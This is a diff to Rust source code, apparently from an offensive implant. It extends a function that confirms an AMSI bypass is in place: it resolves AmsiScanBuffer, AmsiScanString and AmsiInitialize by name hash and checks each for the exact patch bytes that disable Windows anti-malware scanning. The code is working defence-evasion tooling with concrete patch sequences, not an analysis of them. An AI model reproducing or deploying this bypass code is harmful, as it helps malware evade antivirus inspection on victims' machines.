@@ -200,7 +200,13 @@ fn set_init_failed_flag() {
     }
 }
 
-/// Verify AMSI bypass by checking that AmsiScanBuffer starts with our patch bytes.
+/// Verify AMSI bypass by checking that all three patched functions
+/// (AmsiScanBuffer, AmsiScanString, AmsiInitialize) start with the expected
+/// patch bytes.
+///
+/// Returns `true` if amsi.dll is not loaded (trivially successful) or if
+/// all three functions are confirmed patched.  Returns `false` if any
+/// function's patch does not match.
 #[cfg(windows)]
 pub fn verify_bypass() -> bool {
     unsafe {
@@ -210,31 +216,81 @@ pub fn verify_bypass() -> bool {
             None => return true, // amsi.dll not loaded = bypass trivially successful
         };
 
-        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
-        let scan_buf = match pe_resolve::get_proc_address_by_hash(hmod_base, scan_buf_hash) {
-            Some(addr) => addr as *const u8,
-            None => return true,
+        // Helper: resolve a function by hash and read `n` bytes from its entry.
+        // Returns `None` if the function is not found (treated as OK).
+        let resolve_bytes = |name_hash: u32, n: usize| -> Option<(Vec<u8>, *const u8)> {
+            let addr = pe_resolve::get_proc_address_by_hash(hmod_base, name_hash)?;
+            let ptr = addr as *const u8;
+            Some((std::slice::from_raw_parts(ptr, n).to_vec(), ptr))
         };
 
-        // Read 5 bytes so we can check the full mov eax,imm32 + ret form.
-        let bytes = std::slice::from_raw_parts(scan_buf, 5);
-        // Patched forms:
-        //   31 C0 C3                 (xor eax,eax ; ret)
-        //   33 C0 C3                 (xor eax,eax alt encoding ; ret)
-        //   B8 00 00 00 00 + C3      (mov eax,0  ; ret) — 5 bytes shown here
-        let patched = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
-            || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
-            || (bytes[0] == 0xB8
-                && bytes[1] == 0x00
-                && bytes[2] == 0x00
-                && bytes[3] == 0x00
-                && bytes[4] == 0x00);
-
-        if !patched {
-            log::warn!("verify_bypass: AmsiScanBuffer does not appear patched (bytes: {:02x} {:02x} {:02x} {:02x} {:02x})",
-                bytes[0], bytes[1], bytes[2], bytes[3], bytes[4]);
+        // ── AmsiScanBuffer ─────────────────────────────────────────────────
+        // Patched with `xor eax,eax; ret` (31 C0 C3) — 3 bytes, but we read
+        // 6 to also accept the `mov eax,0; ret` form (B8 00 00 00 00 C3).
+        let scan_buf_hash = pe_resolve::hash_str(b"AmsiScanBuffer\0");
+        if let Some((bytes, ptr)) = resolve_bytes(scan_buf_hash, 6) {
+            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor eax,eax; ret
+                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3) // xor alt encoding; ret
+                || (bytes[0] == 0xB8
+                    && bytes[1] == 0x00
+                    && bytes[2] == 0x00
+                    && bytes[3] == 0x00
+                    && bytes[4] == 0x00
+                    && bytes[5] == 0xC3); // mov eax,0; ret
+            if !ok {
+                log::warn!(
+                    "verify_bypass: AmsiScanBuffer not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
+                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
+                );
+                return false;
+            }
+            let _ = ptr;
         }
-        patched
+
+        // ── AmsiScanString ─────────────────────────────────────────────────
+        // Patched with `xor eax,eax; ret` (31 C0 C3) — same pattern.
+        let scan_str_hash = pe_resolve::hash_str(b"AmsiScanString\0");
+        if let Some((bytes, ptr)) = resolve_bytes(scan_str_hash, 6) {
+            let ok = (bytes[0] == 0x31 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
+                || (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3)
+                || (bytes[0] == 0xB8
+                    && bytes[1] == 0x00
+                    && bytes[2] == 0x00
+                    && bytes[3] == 0x00
+                    && bytes[4] == 0x00
+                    && bytes[5] == 0xC3);
+            if !ok {
+                log::warn!(
+                    "verify_bypass: AmsiScanString not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
+                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
+                );
+                return false;
+            }
+            let _ = ptr;
+        }
+
+        // ── AmsiInitialize ─────────────────────────────────────────────────
+        // Patched with `mov eax, 0x80004005; ret`
+        // (B8 05 40 00 80 C3) — 6 bytes.
+        let init_hash = pe_resolve::hash_str(b"AmsiInitialize\0");
+        if let Some((bytes, ptr)) = resolve_bytes(init_hash, 6) {
+            let ok = bytes[0] == 0xB8
+                && bytes[1] == 0x05
+                && bytes[2] == 0x40
+                && bytes[3] == 0x00
+                && bytes[4] == 0x80
+                && bytes[5] == 0xC3;
+            if !ok {
+                log::warn!(
+                    "verify_bypass: AmsiInitialize not patched ({:02x} {:02x} {:02x} {:02x} {:02x} {:02x})",
+                    bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]
+                );
+                return false;
+            }
+            let _ = ptr;
+        }
+
+        true
     }
 }
 
